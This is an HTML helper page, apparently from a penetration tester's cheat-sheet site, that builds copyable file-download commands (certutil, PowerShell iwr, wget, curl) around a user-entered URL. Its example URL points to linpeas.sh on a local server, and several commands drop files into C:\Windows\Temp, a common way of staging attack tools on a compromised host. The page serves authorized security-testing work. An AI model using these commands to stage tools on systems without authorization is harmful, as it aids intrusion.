<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Transfers</title>
    <link rel="stylesheet" href="styles.css">
    <script>
        // Function to update commands dynamically
        function updateCommands() {
            let downloadUrl = document.getElementById("downloadUrlInput").value || "<DOWNLOAD_URL>";
            let commandElements = document.querySelectorAll(".command");

            commandElements.forEach(element => {
                let baseCommand = element.getAttribute("data-base");
                element.textContent = baseCommand
                    .replace("{DOWNLOAD_URL}", downloadUrl)
                    .replace("{OUTFILE}", downloadUrl.split("/").pop() || "output.file");
            });
        }

        // Function to copy command to clipboard
        function copyToClipboard(command) {
            // Replace placeholders with actual values
            let downloadUrl = document.getElementById("downloadUrlInput").value || "<DOWNLOAD_URL>";

            command = command
                .replace("{DOWNLOAD_URL}", downloadUrl)
                .replace("{OUTFILE}", downloadUrl.split("/").pop() || "output.file");

            // Copy to clipboard
            navigator.clipboard.writeText(command).then(() => {
                // Show feedback (tooltip or message)
                showFeedback("Command copied to clipboard!");
            }).catch(err => {
                console.error("Failed to copy: ", err);
            });
        }

        // Function to show feedback (e.g., tooltip or message)
        function showFeedback(message) {
            let feedback = document.createElement("div");
            feedback.textContent = message;
            feedback.style.position = "fixed";
            feedback.style.bottom = "20px";
            feedback.style.left = "50%";
            feedback.style.transform = "translateX(-50%)";
            feedback.style.backgroundColor = "#4caf50";
            feedback.style.color = "#fff";
            feedback.style.padding = "10px 20px";
            feedback.style.borderRadius = "5px";
            feedback.style.zIndex = "1000";
            feedback.style.boxShadow = "0 2px 10px rgba(0, 0, 0, 0.3)";
            document.body.appendChild(feedback);

            // Remove feedback after 2 seconds
            setTimeout(() => {
                feedback.remove();
            }, 2000);
        }

        // Initialize commands on page load
        document.addEventListener("DOMContentLoaded", updateCommands);
    </script>
</head>
<body>
    <!-- Side Navigation -->
    <div class="side-nav">
        <h2>Categories</h2>
        <ul>
            <li><a href="index.html">Main Page</a></li>
            <li><a href="file-transfers.html" target="_blank">File Transfers</a></li>
        </ul>
    </div>

    <!-- Main Content -->
    <div class="main-content">
        <h3>File Transfers</h3>
        <label for="downloadUrlInput">Download URL:</label>
        <input type="text" id="downloadUrlInput" placeholder="e.g., http://10.14.84.70:8000/linpeas.sh" oninput="updateCommands()">
        
        <div style="margin-bottom: 30px;"></div>

        <!-- Windows CMD -->
        <div class="cmd">
            <div class="description">
                <strong>Windows CMD:</strong> Downloads a file using <code>certutil</code>.
            </div>
            
            <div class="command-box" style="margin-bottom: 15px;">
                <span class="command" data-base="certutil -urlcache -f {DOWNLOAD_URL} -o C:\Windows\Temp\{OUTFILE}"></span>
                <button onclick="copyToClipboard('certutil -urlcache -f {DOWNLOAD_URL} -o C:\\Windows\\Temp\\{OUTFILE}')">ðŸ“„</button>
            </div>

            <div class="command-box" style="margin-bottom: 30px;">
                <span class="command" data-base="certutil -urlcache -f {DOWNLOAD_URL} -o {OUTFILE}"></span>
                <button onclick="copyToClipboard('certutil -urlcache -f {DOWNLOAD_URL} -o {OUTFILE}')">ðŸ“„</button>
            </div>
        </div>
        
        <!-- PowerShell -->
        <div class="cmd">
            <div class="description">
                <strong>PowerShell:</strong> Downloads a file using <code>Invoke-WebRequest</code>.
            </div>
            
            <div class="command-box" style="margin-bottom: 15px;">
                <span class="command" data-base="iwr -uri {DOWNLOAD_URL} -Outfile C:\Windows\Temp\{OUTFILE}"></span>
                <button onclick="copyToClipboard('iwr -uri {DOWNLOAD_URL} -Outfile C:\\Windows\\Temp\\{OUTFILE}')">ðŸ“„</button>
            </div>
            
            <div class="command-box" style="margin-bottom: 30px;">
                <span class="command" data-base="iwr -uri {DOWNLOAD_URL} -Outfile {OUTFILE}"></span>
                <button onclick="copyToClipboard('iwr -uri {DOWNLOAD_URL} -Outfile {OUTFILE}')">ðŸ“„</button>
            </div>
        </div>

        <!-- Linux - wget -->
        <div class="cmd">
            <div class="description">
                <strong>Linux - wget:</strong> Downloads a file using <code>wget</code>.
            </div>
            
            <div class="command-box" style="margin-bottom: 30px;">
                <span class="command" data-base="wget {DOWNLOAD_URL} -O {OUTFILE}"></span>
                <button onclick="copyToClipboard('wget {DOWNLOAD_URL} -O {OUTFILE}')">ðŸ“„</button>
            </div>
        </div>

        <!-- Linux - curl -->
        <div class="cmd">
            <div class="description">
                <strong>Linux - curl:</strong> Downloads a file using <code>curl</code>.
            </div>
            
            <div class="command-box" style="margin-bottom: 30px;">
                <span class="command" data-base="curl {DOWNLOAD_URL} -o {OUTFILE}"></span>
                <button onclick="copyToClipboard('curl {DOWNLOAD_URL} -o {OUTFILE}')">ðŸ“„</button>
            </div>
        </div>
    </div>
</body>
</html>